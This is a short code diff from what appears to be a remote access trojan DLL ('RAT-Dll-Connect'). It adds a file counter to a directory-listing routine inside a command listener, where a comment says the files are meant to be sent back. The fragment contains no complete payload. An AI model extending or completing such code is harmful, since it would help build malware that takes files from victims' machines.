@@ -277,8 +277,9 @@ INT startListen()
                 OutputDebugStringA(msgBuf);
 
                 CHAR* dirfiles = NULL;
+                UINT32 numDirFiles = 0;
 
-                status = performDirList(recvBuf, &dirfiles);
+                status = performDirList(recvBuf, &dirfiles, &numDirFiles);
                 if (status != SUCCESS)
                 {
                     sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure received from performDirList %d\n", status);
@@ -287,6 +288,10 @@ INT startListen()
                 }
 
                 // Send back each of our files.. separate out in own function probably
+
+
+
+
 
              }
         }
